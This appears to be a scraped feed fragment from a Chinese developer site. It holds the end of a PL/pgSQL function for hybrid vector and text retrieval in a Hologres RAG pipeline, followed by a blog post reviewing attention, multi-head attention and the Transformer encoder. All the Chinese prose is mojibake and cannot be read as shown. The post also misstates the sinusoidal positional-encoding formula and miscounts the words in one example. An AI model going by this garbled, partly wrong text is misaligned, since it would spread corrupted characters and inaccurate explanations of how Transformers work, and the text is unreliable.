        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF llm_model_valid <span class="hljs-keyword">THEN</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen('</span> <span class="hljs-operator">||</span> quote_literal(llm_model) <span class="hljs-operator">||</span>
            <span class="hljs-string">', replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
                <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">') )'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen(replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
                <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">'))'</span>;
    <span class="hljs-keyword">END</span> IF;

    <span class="hljs-keyword">sql</span> :<span class="hljs-operator">=</span> <span class="hljs-string">'
      WITH embedding_recall AS (
        SELECT
          chunk,
          vec_score,
          ROW_NUMBER() OVER (ORDER BY vec_score DESC) AS rank_vec
        FROM (
          SELECT
            chunk,
            approx_cosine_distance('</span> <span class="hljs-operator">||</span> vector_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> embedding_expr <span class="hljs-operator">||</span> <span class="hljs-string">') AS vec_score
          FROM
            '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
        ) t
        ORDER BY vec_score DESC
        LIMIT '</span> <span class="hljs-operator">||</span> vector_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
      ),
      text_search_recall AS (
        SELECT
          chunk,
          text_score,
          ROW_NUMBER() OVER (ORDER BY text_score DESC) AS rank_text
        FROM (
          SELECT
            chunk,
            text_search('</span> <span class="hljs-operator">||</span> text_search_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">') AS text_score
          FROM
            '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
        ) ts
        WHERE text_score &gt; 0
        ORDER BY text_score DESC
        LIMIT '</span> <span class="hljs-operator">||</span> text_search_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
      ),
      rrf_scores AS (
        SELECT
          chunk,
          SUM(1.0 / ('</span> <span class="hljs-operator">||</span> rrf_k <span class="hljs-operator">||</span> <span class="hljs-string">' + rank_val)) AS rrf_score
        FROM (
          SELECT chunk, rank_vec AS rank_val FROM embedding_recall
          UNION ALL
          SELECT chunk, rank_text AS rank_val FROM text_search_recall
        ) sub
        GROUP BY chunk
      ),
      top_chunks AS (
        SELECT chunk
        FROM rrf_scores
        ORDER BY rrf_score DESC
        LIMIT '</span> <span class="hljs-operator">||</span> rerank_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
      ),
      concat_top_chunks AS (
        SELECT string_agg(chunk, E''\n\n----\n\n'') AS merged_chunks FROM top_chunks
      )
      SELECT '</span> <span class="hljs-operator">||</span> ai_gen_expr <span class="hljs-operator">||</span> <span class="hljs-string">'
      FROM concat_top_chunks;
    '</span>;

    <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">INTO</span> final_answer;
    <span class="hljs-keyword">RETURN</span> final_answer;
<span class="hljs-keyword">END</span>;
$$ <span class="hljs-keyword">LANGUAGE</span> plpgsql;
</code></pre>
<p>å¦‚æœæƒ³ä½“éªŒæ›´å¤šæ“ä½œæµç¨‹ï¼Œæ¬¢è¿åˆ°é˜¿é‡Œäº‘å®˜ç½‘é¢†å–Hologreså…è´¹è¯•ç”¨ï¼Œå¼€é€šHologres4.0ï¼Œå¹¶æŒ‰ç…§æ“ä½œæ–‡æ¡£å®è·µã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fhologres%2Fuser-guide%2Fbest-practices-financial-multimodal-ai-data-analysis-and-retrieval-system" target="_blank" title="https://help.aliyun.com/zh/hologres/user-guide/best-practices-financial-multimodal-ai-data-analysis-and-retrieval-system" ref="nofollow noopener noreferrer">help.aliyun.com/zh/hologresâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[attentionã€transformã€bert å¤ä¹ æ€»ç»“ 1]]></title>    <link>https://juejin.cn/post/7575910298283802659</link>    <guid>https://juejin.cn/post/7575910298283802659</guid>    <pubDate>2025-11-24T10:49:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910298283802659" data-draft-id="7575910298283786275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="attentionã€transformã€bert å¤ä¹ æ€»ç»“ 1"/> <meta itemprop="keywords" content="ç®—æ³•,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-11-24T10:49:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ®äººä¸‰ç­‰"/> <meta itemprop="url" content="https://juejin.cn/user/4350105576808472"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            attentionã€transformã€bert å¤ä¹ æ€»ç»“ 1
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4350105576808472/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ®äººä¸‰ç­‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:49:40.000Z" title="Mon Nov 24 2025 10:49:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è¯¦ç»†å†…å®¹è§ï¼š</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FLian_Ge_Blog%2Farticle%2Fdetails%2F132156812%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/Lian_Ge_Blog/article/details/132156812?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">attention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FLian_Ge_Blog%2Farticle%2Fdetails%2F132783696%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/Lian_Ge_Blog/article/details/132783696?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">transform</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F715589044" target="_blank" title="https://zhuanlan.zhihu.com/p/715589044" ref="nofollow noopener noreferrer">bert</a></li>
</ul>
<h2 data-id="heading-1">1 æ³¨æ„åŠ›æœºåˆ¶ï¼š</h2>
<ul>
<li>ç®€å•é€šä¿—æè¿°è®¡ç®—è¿‡ç¨‹ï¼šQï¼ŒKï¼ŒV(queryï¼Œkeyï¼Œvalue)ï¼› æˆ‘ä»¬é¦–å…ˆéœ€è¦è®¡ç®—ä¸€ä¸‹ Q å’Œ Kçš„è·ç¦»(ç›¸ä¼¼åº¦)ï¼Œå¯ä»¥ä½¿ç”¨å‘é‡ç‚¹ç§¯ï¼Œä½™å¼¦ç›¸ä¼¼æ€§ï¼Œæˆ–è€… MLPï¼Œè®¡ç®—ç»“æœè¿›è¡Œsoftmaxå¤„ç†ï¼Œä¸€æ˜¯å½’ä¸€åŒ–å¤„ç†ï¼ŒäºŒæ˜¯çªå‡ºé«˜æƒé‡Kï¼Œç„¶åæ ¹æ®æœ€æ–°å¤„ç†çš„K å€¼ä¸å¯¹åº” V å€¼ï¼ŒåŠ æƒæ±‚å’Œå³æ˜¯ attention å€¼</li>
<li>ä¸¾ä¾‹ï¼š
<ul>
<li>1 æˆ‘å–œæ¬¢åƒè‹¹æœï¼Œä¹Ÿå–œæ¬¢åƒé¦™è•‰ï¼Œä¸å–œæ¬¢åƒæ¦´è²â€ï¼ˆ3 ä¸ªçŸ­è¯­ï¼Œå¯¹åº” 3 ä¸ªä¿¡æ¯å•å…ƒï¼‰</li>
<li>2 æˆ‘æœ€å–œæ¬¢åƒä»€ä¹ˆæ°´æœï¼Ÿâ€ è¿™ä¸ªé—®é¢˜ï¼ˆQï¼‰ï¼š</li>
<li>3 ç”Ÿæˆ K å’Œ Vï¼šK1=â€œè‹¹æœâ€ï¼ŒV1=â€œå–œæ¬¢åƒâ€ï¼›K2=â€œé¦™è•‰â€ï¼ŒV2=â€œå–œæ¬¢åƒâ€ï¼›K3=â€œæ¦´è²â€,V3=â€œä¸å–œæ¬¢åƒâ€ï¼›</li>
<li>4 Q=â€œæœ€å–œæ¬¢çš„æ°´æœâ€ï¼Œå’Œ K åŒ¹é…ï¼šQ vs K1ï¼ˆè‹¹æœï¼‰ï¼šç›¸å…³ï¼ˆå–œæ¬¢ï¼‰ï¼Œæƒé‡ 3ï¼›Q vs K2ï¼ˆé¦™è•‰ï¼‰ï¼šç›¸å…³ï¼ˆå–œæ¬¢ï¼‰ï¼Œæƒé‡ 3ï¼›Q vs K3ï¼ˆæ¦´è²ï¼‰ï¼šæ— å…³ï¼ˆä¸å–œæ¬¢ï¼‰ï¼Œæƒé‡ 0ï¼›</li>
<li>5 åŠ æƒåˆå¹¶ Vï¼šé‡ç‚¹æå– â€œå–œæ¬¢åƒè‹¹æœâ€ å’Œ â€œå–œæ¬¢åƒé¦™è•‰â€ï¼Œæœ€ç»ˆè¾“å‡º â€œä½ æœ€å–œæ¬¢åƒè‹¹æœå’Œé¦™è•‰â€ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">2 è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼š</h3>
<ul>
<li>æ²¡æœ‰å¤–æ¥çš„ Qï¼Œè‡ªå·±è¿™æ®µä¿¡æ¯åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œä¸åŒéƒ¨åˆ†å’Œå…¶ä»–éƒ¨åˆ†å……å½“ Qï¼ŒKï¼ŒV
<ul>
<li>ä¸¾ä¾‹ï¼š
<ul>
<li>1 â€œå°æ˜å»è¶…å¸‚ä¹°äº†ç‰›å¥¶ï¼Œä»–å–å®Œåè§‰å¾—å¾ˆå¥½å–â€ï¼ˆè¾“å…¥æ–‡æœ¬çš„ 6 ä¸ªè¯ï¼šå°æ˜ã€å»ã€è¶…å¸‚ã€ä¹°äº†ã€ç‰›å¥¶ã€ä»–ã€å–å®Œã€è§‰å¾—ã€å¾ˆå¥½å–ï¼‰ã€‚</li>
<li>2 å†™ â€œä»–â€ è¿™ä¸ªè¯æ—¶ï¼Œä½ å¾—çŸ¥é“ â€œä»–â€ æŒ‡çš„æ˜¯è° â€”â€” è¿™å°±æ˜¯è‡ªæ³¨æ„åŠ›æœºåˆ¶åœ¨å·¥ä½œ</li>
<li>3 æ¯ä¸ªè¯éƒ½å½“ â€œæé—®è€…ï¼ˆQï¼‰â€ï¼šâ€œä»–â€ è¿™ä¸ªè¯ä¼šç”Ÿæˆä¸€ä¸ª Qï¼ˆæŸ¥è¯¢ï¼‰ï¼šâ€œä»–æŒ‡çš„æ˜¯è°ï¼Ÿâ€åŒæ—¶ï¼Œæ¯ä¸ªè¯ä¹Ÿéƒ½å½“ â€œè¢«æŸ¥è€…ï¼ˆK/Vï¼‰â€ï¼šæ‰€æœ‰è¯éƒ½ä¼šç”Ÿæˆè‡ªå·±çš„ Kï¼ˆæ ‡ç­¾ï¼‰å’Œ Vï¼ˆå†…å®¹ï¼‰ï¼š
<ul>
<li>å°æ˜ï¼šK=â€œäººå - å°æ˜â€ï¼ŒV=â€œå¥å­ä¸»è¯­ï¼Œå»è¶…å¸‚çš„äººâ€ï¼›</li>
<li>å»ï¼šK=â€œåŠ¨ä½œ - å»â€ï¼ŒV=â€œå‰å¾€æŸåœ°â€ï¼›</li>
<li>è¶…å¸‚ï¼šK=â€œåœ°ç‚¹ - è¶…å¸‚â€ï¼ŒV=â€œè´­ç‰©çš„åœ°æ–¹â€ï¼›</li>
<li>ä»–ï¼šK=â€œä»£è¯ - ä»–â€ï¼ŒV=â€œæŒ‡ä»£å‰æ–‡çš„äººâ€ï¼›</li>
</ul>
</li>
<li>4 Q "ä»–"å»åŒ¹é…æ‰€æœ‰è¯çš„ Kï¼šQï¼ˆâ€œæˆ‘æŒ‡çš„æ˜¯è°ï¼Ÿâ€ï¼‰ vs Kï¼ˆå°æ˜ï¼‰ï¼›Q vs Kï¼ˆå» / è¶…å¸‚ / ç‰›å¥¶ï¼‰ï¼›Q vs Kï¼ˆä»–è‡ªå·±ï¼‰ï¼›</li>
<li>5 åŠ æƒæå– V çš„ä¿¡æ¯ï¼šé‡ç‚¹æå– â€œå°æ˜â€ çš„ Vï¼Œå…¶ä»–è¯çš„ V å‡ ä¹å¿½ç•¥ï¼›æœ€ç»ˆ â€œä»–â€ å°±æ˜ç¡®äº†ï¼šè¿™å°±æ˜¯è‡ªæ³¨æ„åŠ›é€šè¿‡ â€œå†…éƒ¨æŸ¥è¯¢â€ æ‰¾åˆ°çš„å…³è”ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">3 å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶ï¼š</h3>
<ul>
<li>æŠŠè‡ªæ³¨æ„åŠ›æœºåˆ¶å¤åˆ¶å¤šä»½ï¼ˆâ€œå¤šä¸ªå¤´â€ï¼‰ï¼Œæ¯ä¸ªå¤´ä¸“æ³¨äºæ‰¾æ–‡æœ¬ä¸­ä¸åŒç»´åº¦çš„å…³è”ï¼ˆæ¯”å¦‚ä¸€ä¸ªå¤´æ‰¾æŒ‡ä»£å…³ç³»ã€ä¸€ä¸ªå¤´æ‰¾åŠ¨ä½œå’Œå¯¹è±¡ã€ä¸€ä¸ªå¤´æ‰¾å› æœå…³ç³»ï¼‰ï¼Œæœ€åæŠŠæ‰€æœ‰å¤´çš„ç»“æœåˆå¹¶ï¼Œè®©ç†è§£æ›´å…¨é¢ã€‚
<ul>
<li>ä¸¾ä¾‹ï¼š
<ul>
<li>1  â€œå°æ˜åœ¨è¶…å¸‚ä¹°äº†ç‰›å¥¶ï¼Œä»–å–å®Œåè§‰å¾—å¾ˆç”œï¼Œäºæ˜¯åˆä¹°äº†ä¸€ç®±â€ï¼ˆæ ¸å¿ƒå…³è”æœ‰ 3 ä¸ªï¼šâ€œä»–â€ æŒ‡ä»£ â€œå°æ˜â€ã€â€œå–â€ çš„å¯¹è±¡æ˜¯ â€œç‰›å¥¶â€ã€â€œåˆä¹°â€ çš„åŸå› æ˜¯ â€œå¾ˆç”œâ€ï¼‰ã€‚</li>
<li>2 æ‰€æœ‰å¤´å…±äº«è¾“å…¥æ–‡æœ¬çš„ Qã€Kã€Vï¼ˆä½†ä¼šå„è‡ªåšå¾®å°çš„ â€œå‚æ•°è°ƒæ•´â€ï¼Œè®©æ¯ä¸ªå¤´çš„å…³æ³¨ç‚¹ä¸åŒï¼‰â€”â€” ç›¸å½“äº 3 ä¸ªå°ç»„éƒ½æ‹¿åˆ°åŒä¸€ä»½æŠ¥å‘Šï¼Œ but å„è‡ªçš„åˆ†æä¾§é‡ç‚¹é¢„è®¾ä¸åŒã€‚</li>
<li>3 å¤´ 1ï¼ˆè´Ÿè´£ â€œæŒ‡ä»£å…³ç³»â€ï¼‰ï¼šé‡ç‚¹æ‰¾ â€œè°æŒ‡è°â€:ä»¥ â€œä»–â€ ä¸º Qï¼ˆâ€œæˆ‘æŒ‡è°ï¼Ÿâ€ï¼‰ï¼ŒåŒ¹é…æ‰€æœ‰ Kï¼Œæœ€ç»ˆé”å®š â€œå°æ˜â€ çš„ Vï¼Œå¾—å‡ºç»“è®ºï¼šâ€œä»– = å°æ˜â€ï¼›
<ul>
<li>å¤´ 2ï¼ˆè´Ÿè´£ â€œåŠ¨ä½œ - å¯¹è±¡å…³ç³»â€ï¼‰ï¼šé‡ç‚¹æ‰¾ â€œåŠ¨ä½œå¯¹åº”ä»€ä¹ˆä¸œè¥¿â€ä»¥ â€œå–â€ ä¸º Qï¼ˆâ€œæˆ‘é’ˆå¯¹çš„å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿâ€ï¼‰ï¼ŒåŒ¹é…æ‰€æœ‰ Kï¼Œé”å®š â€œç‰›å¥¶â€ çš„ Vï¼Œå¾—å‡ºç»“è®ºï¼šâ€œå–çš„æ˜¯ç‰›å¥¶â€ï¼›</li>
<li>å¤´ 3ï¼ˆè´Ÿè´£ â€œå› æœå…³ç³»â€ï¼‰ï¼šé‡ç‚¹æ‰¾ â€œä¸ºä»€ä¹ˆåšè¿™ä¸ªåŠ¨ä½œâ€ä»¥ â€œåˆä¹°â€ ä¸º Qï¼ˆâ€œæˆ‘å‘ç”Ÿçš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿâ€ï¼‰ï¼ŒåŒ¹é…æ‰€æœ‰ Kï¼Œé”å®š â€œå¾ˆç”œâ€ çš„ Vï¼Œå¾—å‡ºç»“è®ºï¼šâ€œåˆä¹°æ˜¯å› ä¸ºç‰›å¥¶ç”œâ€ã€‚</li>
</ul>
</li>
<li>4 æŠŠ 3 ä¸ªå°ç»„çš„ç»“è®ºåˆå¹¶ï¼šâ€œå°æ˜åœ¨è¶…å¸‚ä¹°äº†ç‰›å¥¶ï¼Œå°æ˜å–å®Œç‰›å¥¶åè§‰å¾—å¾ˆç”œï¼Œå› ä¸ºç‰›å¥¶ç”œæ‰€ä»¥å°æ˜åˆä¹°äº†ä¸€ç®±â€â€”â€” æ¯”å•ä¸ªå¤´åªæ‰¾ä¸€ç§å…³è”ï¼Œç†è§£æ›´å®Œæ•´ã€æ›´ç²¾å‡†ã€‚</li>
<li>5 æ³¨æ„ï¼šå¤´çš„æ•°é‡è¦èƒ½è¢«ç»´åº¦æ•´é™¤</li>
<li>6 åˆ†å¤´æ˜¯å¯¹æ¯ä¸€ä¸ª Qï¼ŒKï¼ŒV çš„å‘é‡åŒ–ç»“æœè¿›è¡Œåˆ†å¤´ï¼Œä¹Ÿå°±æ˜¯ä¸€æ®µè¯åˆ†æˆå‡ æ®µå„¿</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 data-id="heading-4">4 transformï¼š</h2>
<ul>
<li>å·¦ä¾§ Encodeï¼šç†è§£è¾“å…¥å†…å®¹(èƒ½çœ‹åˆ°å…¨æ–‡)ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œå¯ä»¥çœ‹æˆæ˜¯ä¸“å±"è¯å…¸"
<ul>
<li>1 è¾“å…¥æ•°æ®(ç¼–ç ï¼šè§åŸºç¡€çŸ¥è¯†)+ä½ç½®ä¿¡æ¯(PEç¼–ç ç”¨çš„æ­£å¼¦ä½™å¼¦è·ç¦»)ï¼ŒSin| Cos(pos / 10000 * (2 i  * d))
<ul>
<li>å¥‡æ•°ç”¨Cosï¼Œå¶æ•°ç”¨ Sinï¼Œpos æ˜¯åˆ†è¯ä½ç½®é¡ºåºï¼Œi æ˜¯åˆ†è¯å‘é‡çš„å‘é‡å€¼é¡ºåºï¼Œd æ˜¯å‘é‡é•¿åº¦</li>
<li>å¥½å¤„å°±æ˜¯ï¼šå¯ä»¥åº”å¯¹æœªå‡ºç°è¿‡æ›´é•¿çš„å¥å­ï¼› æ¯ä¸ªåˆ†è¯éƒ½æœ‰ç‹¬ä¸€æ— äºŒçš„ä½ç½®ä¿¡æ¯</li>
</ul>
</li>
<li>2 å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶(å¤šå¤´å°±æ˜¯è‡ªæ³¨æ„åŠ›å¹¶è¡Œ)ï¼šè¾“å…¥ä¿¡æ¯å’Œä½ç½®ä¿¡æ¯è¾“å…¥åï¼Œé€šè¿‡ attention æœºåˆ¶è¿›ä¸€æ­¥æå–æ›´å¤šçš„ä¿¡æ¯</li>
<li>3 Add å’Œ Normï¼š
<ul>
<li>Addï¼šæ­¤æ—¶çš„ Add æ˜¯ä¸€ä¸ªæ®‹å·®è¿æ¥ï¼Œå³ è¾“å‡º = åŸå§‹è¾“å…¥ + å¤šå¤´(åŸå§‹è¾“å…¥)
<ul>
<li>1 é˜²æ­¢è¿‡åº¦åŠ å·¥ï¼Œä¿ç•™åˆå§‹ä¿¡æ¯ï¼Œé˜²æ­¢å¤šå¤´å¤„ç†æ•ˆæœå·®å¯¼è‡´é¢„è®­ç»ƒè¶Šå·®ï¼›</li>
<li>2 è®­ç»ƒéšç€å±‚æ•°å¢åŠ ï¼Œè°ƒæ•´å‚æ•°çš„ä¿¡æ¯ä¼šè¶Šä¼ é€’è¶Šå¼±ï¼Œæ®‹å·®è¿æ¥å¯ä»¥ä¿æŒ"ä¿¡å·"å¼ºåº¦</li>
<li>Normï¼š æ ‡å‡†åŒ–å¤„ç†(å½’ä¸€åŒ–å±äºæ ‡å‡†åŒ–çš„ä¸€ç§)ï¼Œé˜²æ­¢æ•°å€¼è¿‡å¤§æˆ–è€…è¿‡å°å¯¼è‡´çš„æ¢¯åº¦çˆ†ç‚¸/æ¶ˆå¤±ï¼› æ ‡å‡†åŒ–åæ•°å€¼å°ï¼Œå¯ä»¥åŠ é€Ÿæ”¶æ•›</li>
<li>çˆ†ç‚¸å°±æ˜¯"ä¿¡å·"è¶Šæ¥è¶Šå¤§ï¼Œé˜²æ­¢æ¶ˆæ¯å°±æ˜¯è¶Šæ¥è¶Šå¼±</li>
</ul>
</li>
</ul>
</li>
<li>4 Feed Forwordï¼š ä¸¤å±‚å…¨è¿æ¥å±‚ï¼Œä¸€å±‚æœ‰æ¿€æ´»å‡½æ•°ï¼Œä¸€å±‚æ²¡æœ‰ï¼Œå…¬å¼max(0,XW1+b1)W2+b2
<ul>
<li>ç¬¬ä¸€å±‚ï¼šä½¿ç”¨å…¨è¿æ¥å±‚æé«˜ç»´åº¦æ”¾å¤§è¾“å…¥æ•°æ®ä¸­çš„æœ‰æ•ˆéƒ¨åˆ†ï¼Œç„¶åä½¿ç”¨Relu å‡½æ•° max() è¿›ä¸€æ­¥æ‰©å¤§æœ‰æ•ˆå’Œæ— æ•ˆæ•°æ®çš„å·®å¼‚</li>
<li>ç¬¬äºŒå±‚ï¼šå†é€šè¿‡å…¨è¿æ¥å±‚æŠŠç»´åº¦é™ä½ï¼Œç•™ä¸‹æœ‰æ•ˆéƒ¨åˆ†</li>
</ul>
</li>
</ul>
</li>
<li>å³ä¾§ Dncodeï¼šç”Ÿæˆè¾“å‡º(ä¸èƒ½çœ‹åˆ°å…¨æ–‡)ï¼Œä»¥ç¿»è¯‘ä»»åŠ¡ä¸ºä¾‹
<ul>
